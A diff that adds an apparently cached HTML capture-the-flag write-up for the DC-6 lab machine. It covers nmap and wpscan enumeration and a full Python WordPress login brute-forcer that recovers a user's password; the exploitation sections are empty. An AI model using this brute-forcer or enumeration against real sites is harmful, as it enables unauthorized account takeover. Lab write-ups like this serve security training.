@@ -1,0 +1,168 @@
+I"µ<<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.187 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--open</span> 192.168.179.187 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 192.168.179.187 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Did not follow redirect to http://wordy/
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.179.187 wordy"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc6/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://wordy/ <span class="nt">--enumerate</span> vp,vt,u 
+...
+<span class="o">[</span>+] WordPress version 5.1.1 identified <span class="o">(</span>Insecure, released on 2019-03-13<span class="o">)</span><span class="nb">.</span>
+ | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.1.1&lt;/generator&gt;
+ |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.1.1&lt;/generator&gt;
+ ...
+ <span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] admin
+ | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] graham
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] mark
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] sarah
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] jens
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"admin</span><span class="se">\n</span><span class="s2">graham</span><span class="se">\n</span><span class="s2">jens</span><span class="se">\n</span><span class="s2">mark</span><span class="se">\n</span><span class="s2">sarah"</span> <span class="o">&gt;</span> users.txt 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://wordy/ <span class="nt">--plugins-detection</span> aggressive
+...
+<span class="o">[</span>+] plainview-activity-monitor
+ | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
+ | Last Updated: 2018-08-26T15:08:00.000Z
+ | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 20180826
+ | <span class="o">[!]</span> Directory listing is enabled
+ |
+ | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200
+ |
+ | Version: 20161228 <span class="o">(</span>50% confidence<span class="o">)</span>
+ | Found By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz | <span class="nb">grep</span> <span class="s1">'k01'</span> <span class="o">&gt;</span> passwords.txt
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span> <span class="n">Fore</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Wordpress brute forecer.'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--url'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'URL'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Wordpress login url'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'USER'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Wordpress user'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-L'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'USERFILE'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Users file'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-P'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'PASSFILE'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Password file'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span>
+<span class="n">user</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">l</span>
+<span class="n">users_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">L</span>
+<span class="n">password_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">P</span>
+
+<span class="n">init</span><span class="p">()</span>
+<span class="n">green</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
+<span class="n">yellow</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">YELLOW</span>
+<span class="n">gray</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLACK_EX</span>
+<span class="n">reset</span> <span class="o">=</span> <span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
+    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'log'</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
+            <span class="s">'pwd'</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span>
+            <span class="s">'wp-submit'</span><span class="p">:</span><span class="s">'Log+In'</span>
+            <span class="p">}</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nb">SystemExit</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+
+
+<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">password_file</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">checkLogin</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">"ERROR"</span> <span class="ow">in</span> <span class="n">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">gray</span><span class="si">}</span><span class="s">Trying =&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s">Found =&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="k">if</span> <span class="n">users_file</span><span class="p">:</span>
+    <span class="n">users</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">users_file</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+        <span class="n">checkLogin</span><span class="p">()</span>
+<span class="k">elif</span> <span class="n">user</span><span class="p">:</span>
+    <span class="n">checkLogin</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/DC-6<span class="nv">$ </span>python3 wpforce.py <span class="nt">--url</span> http://wordy/wp-login.php <span class="nt">-L</span> users.txt <span class="nt">-P</span> passwords.txt 
+Found <span class="o">=&gt;</span> mark:helpdesk01
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc6/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/dc6/screenshot-3.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+:ET
